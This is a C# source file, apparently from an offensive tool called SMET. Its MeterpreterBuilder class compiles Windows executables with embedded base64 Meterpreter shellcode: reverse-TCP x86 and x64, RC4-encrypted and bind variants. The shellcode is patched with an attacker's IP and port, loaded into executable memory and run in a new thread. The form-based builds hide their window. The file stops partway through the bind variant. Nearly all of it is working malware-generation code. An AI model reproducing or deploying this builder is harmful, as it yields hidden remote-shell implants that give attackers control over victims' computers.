using System;
using System.Windows.Forms;

namespace SMET
{
    internal class MeterpreterBuilder
    {
        public string Ip = string.Empty;
        public string Port = string.Empty;
        public string FileName = string.Empty;
        public void SaveReverseMeterpreterConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr = "using System;" +
                         "using System.Runtime.InteropServices;" +
                         "using System.Threading.Tasks;" +

                         "namespace MeterpreterBuilder" +
                         "{" +
                         "class ReverseMeterpreter" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         "Task.Factory.StartNew(() => RunMeterpreter(\"" + Ip + "\", \"" + Port + "\"));" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string ip, string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "var ipOctetSplit = ip.Split('.');" +
                         "byte octByte1 = Convert.ToByte(ipOctetSplit[0]);" +
                         "byte octByte2 = Convert.ToByte(ipOctetSplit[1]);" +
                         "byte octByte3 = Convert.ToByte(ipOctetSplit[2]);" +
                         "byte octByte4 = Convert.ToByte(ipOctetSplit[3]);" +
                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "port1Byte = 0x00;" +
                         "port2Byte = Convert.ToByte(inputPort);" +
                         "}" +
                         "byte[] shellCodePacket = new byte[9];" +
                         "shellCodePacket[0] = octByte1;" +
                         "shellCodePacket[1] = octByte2;" +
                         "shellCodePacket[2] = octByte3;" +
                         "shellCodePacket[3] = octByte4;" +
                         "shellCodePacket[4] = 0x68;" +
                         "shellCodePacket[5] = 0x02;" +
                         "shellCodePacket[6] = 0x00;" +
                         "shellCodePacket[7] = port1Byte;" +
                         "shellCodePacket[8] = port2Byte;" +
                         "string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCANkDieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8M=\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"wKiLhmgCANkD\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                         "}" +
                         "}";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_reverse.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse.exe", compiler.isCreated);
        }
        public void SaveReverseMeterpreter()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr =
                "using System; using System.Runtime.InteropServices; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; if (inputPort > 256) { int portOct1 = inputPort/256; int portOct2 = portOct1*256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1*256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); } } else { port1Byte = 0x00; port2Byte = Convert.ToByte(inputPort); } byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCANkDieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8M=\"; string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeRaw.Replace(\"wKiLhmgCANkD\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32) shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr) (funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } }";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_reverse.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse.exe", compiler.isCreated);
        }
        public void SaveMeterpreterRc4Console()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr = "using System;" +
                         "using System.Runtime.InteropServices;" +

                         "namespace MeterpreterBuilder" +
                         "{" +
                         "class MeterpreterRc4" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         "RunMeterpreter(\"" + Ip + "\", \"" + Port + "\");" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string ip, string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "var ipOctetSplit = ip.Split('.');" +
                         "byte octByte1 = Convert.ToByte(ipOctetSplit[0]);" +
                         "byte octByte2 = Convert.ToByte(ipOctetSplit[1]);" +
                         "byte octByte3 = Convert.ToByte(ipOctetSplit[2]);" +
                         "byte octByte4 = Convert.ToByte(ipOctetSplit[3]);" +

                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "byte[] shellCodePacket = new byte[15];" +
                         "shellCodePacket[0] = 0x6a;" +
                         "shellCodePacket[1] = 0x05;" +
                         "shellCodePacket[2] = 0x68;" +
                         "shellCodePacket[3] = octByte1;" +
                         "shellCodePacket[4] = octByte2;" +
                         "shellCodePacket[5] = octByte3;" +
                         "shellCodePacket[6] = octByte4;" +
                         "shellCodePacket[7] = 0x68;" +
                         "shellCodePacket[8] = 0x02;" +
                         "shellCodePacket[9] = 0x00;" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "shellCodePacket[10] = port1Byte;" +
                         "shellCodePacket[11] = port2Byte;" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "shellCodePacket[10] = port1Byte;" +
                         "shellCodePacket[11] = Convert.ToByte(inputPort);" +
                         "}" +
                         "shellCodePacket[12] = 0x89;" +
                         "shellCodePacket[13] = 0xe6;" +
                         "shellCodePacket[14] = 0x50;" +

                         "string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04Idezo1gAAAGoAagRWV2gC2chf/9WD+AB+SYs2gfbrYEhjjY4AAQAAakBoABAAAFFqAGhYpFPl/9WNmAABAABTVlBqAFZTV2gC2chf/9WD+AB9IlhoAEAAAGoAUGgLLw8w/9VXaHVuTWH/1V5e/wwk6V7///8BwynGdcdbWV1VV4nf6BAAAADdV2PPqbQaL1HF9q6xpi5lXjHAqv7AdfuB7wABAAAx2wIcB4nCgOIPAhwWihQHhhQfiBQH/sB16DHb/sACHAeKFAeGFB+IFAcCFB+KFBcwVQBFSXXlX8M=\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"agVowKiLhmgCABFcieZQ\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +

                         "}" +
                         "}";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_rc4.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_rc4.exe", compiler.isCreated);
        }
        public void SaveMeterpreterRc4()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr =
                "using System; using System.Runtime.InteropServices; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[15]; shellCodePacket[0] = 0x6a; shellCodePacket[1] = 0x05; shellCodePacket[2] = 0x68; shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x68; shellCodePacket[8] = 0x02; shellCodePacket[9] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[10] = port1Byte; shellCodePacket[11] = port2Byte; } } else { shellCodePacket[10] = port1Byte; shellCodePacket[11] = Convert.ToByte(inputPort); } shellCodePacket[12] = 0x89; shellCodePacket[13] = 0xe6; shellCodePacket[14] = 0x50; string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04Idezo1gAAAGoAagRWV2gC2chf/9WD+AB+SYs2gfbrYEhjjY4AAQAAakBoABAAAFFqAGhYpFPl/9WNmAABAABTVlBqAFZTV2gC2chf/9WD+AB9IlhoAEAAAGoAUGgLLw8w/9VXaHVuTWH/1V5e/wwk6V7///8BwynGdcdbWV1VV4nf6BAAAADdV2PPqbQaL1HF9q6xpi5lXjHAqv7AdfuB7wABAAAx2wIcB4nCgOIPAhwWihQHhhQfiBQH/sB16DHb/sACHAeKFAeGFB+IFAcCFB+KFBcwVQBFSXXlX8M=\"; string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeRaw.Replace(\"agVowKiLhmgCABFcieZQ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_rc4.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_rc4.exe", compiler.isCreated);
        }
        public void Savex64ReverseMeterpreterConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr = "using System;" +
                         "using System.Runtime.InteropServices;" +

                         "namespace MeterpreterBuilder" +
                         "{" +
                         "class x64ReverseMeterpreter" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         "RunMeterpreter(\"" + Ip + "\", \"" + Port + "\");" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string ip, string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "var ipOctetSplit = ip.Split('.');" +
                         "byte octByte1 = Convert.ToByte(ipOctetSplit[0]);" +
                         "byte octByte2 = Convert.ToByte(ipOctetSplit[1]);" +
                         "byte octByte3 = Convert.ToByte(ipOctetSplit[2]);" +
                         "byte octByte4 = Convert.ToByte(ipOctetSplit[3]);" +

                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "byte[] shellCodePacket = new byte[9];" +
                         "shellCodePacket[0] = 0x00;" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "shellCodePacket[1] = port1Byte;" +
                         "shellCodePacket[2] = port2Byte;" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "shellCodePacket[1] = port1Byte;" +
                         "shellCodePacket[2] = Convert.ToByte(inputPort);" +
                         "}" +
                         "shellCodePacket[3] = octByte1;" +
                         "shellCodePacket[4] = octByte2;" +
                         "shellCodePacket[5] = octByte3;" +
                         "shellCodePacket[6] = octByte4;" +
                         "shellCodePacket[7] = 0x41;" +
                         "shellCodePacket[8] = 0x54;" +

                         "string shellCodeRaw = \"/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKiLgUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dY\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"ABFcwKiLgUFU\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                         "}" +
                         "}";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_x64_reverse.exe", strMtr, "x64");
            ReturnMessageBox(randomFileName + "_x64_reverse.exe", compiler.isCreated);
        }
        public void Savex64ReverseMeterpreter()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr =
                "using System; using System.Runtime.InteropServices; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[1] = port1Byte; shellCodePacket[2] = port2Byte; } } else { shellCodePacket[1] = port1Byte; shellCodePacket[2] = Convert.ToByte(inputPort); } shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x41; shellCodePacket[8] = 0x54; string shellCodeRaw = \"/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKiLgUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dY\"; string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeRaw.Replace(\"ABFcwKiLgUFU\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_x64_reverse.exe", strMtr, "x64");
            ReturnMessageBox(randomFileName + "_x64_reverse.exe", compiler.isCreated);
        }
        public void SaveBindMeterpreterConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr = "using System;" +
                         "using System.Collections.Generic;" +
                         "using System.IO;" +
                         "using System.Runtime.InteropServices;" +
                         "using System.Text;" +
                         "using System.Threading;" +

                         "namespace MeterpreterBuilder" +
                         "{" +
                         "class BindMeterpreter" +
                         "{" +
                         "static void Main(string[] args)" +
                         "{" +
                         " RunMeterpreter(\"" + Port + "\");" +
                         "var str = Convert.ToString(Console.ReadLine());" +
                         "}" +
                         "public static void RunMeterpreter(string port)" +
                         "{" +
                         "try" +
                         "{" +
                         "int inputPort = Int32.Parse(port);" +
                         "byte port1Byte = 0x00;" +
                         "byte port2Byte = 0x00;" +
                         "byte[] shellCodePacket = new byte[6];" +
                         "if (inputPort > 256)" +
                         "{" +
                         "int portOct1 = inputPort / 256;" +
                         "int portOct2 = portOct1 * 256;" +
                         "int portOct3 = inputPort - portOct2;" +
                         "int portoct1Calc = portOct1 * 256 + portOct3;" +
                         "if (inputPort == portoct1Calc)" +
                         "{" +
                         "port1Byte = Convert.ToByte(portOct1);" +
                         "port2Byte = Convert.ToByte(portOct3);" +
                         "shellCodePacket[0] = 0x68;" +
                         "shellCodePacket[1] = 0x02;" +
                         "shellCodePacket[2] = 0x00;" +
                         "shellCodePacket[3] = port1Byte;" +
                         "shellCodePacket[4] = port2Byte;" +
                         "shellCodePacket[5] = 0x89;" +
                         "}" +
                         "}" +
                         "else" +
                         "{" +
                         "shellCodePacket[0] = 0x68;" +
                         "shellCodePacket[1] = 0x02;" +
                         "shellCodePacket[2] = 0x00;" +
                         "shellCodePacket[3] = port1Byte;" +
                         "shellCodePacket[4] = Convert.ToByte(inputPort);" +
                         "shellCodePacket[5] = 0x89;" +
                         "}" +

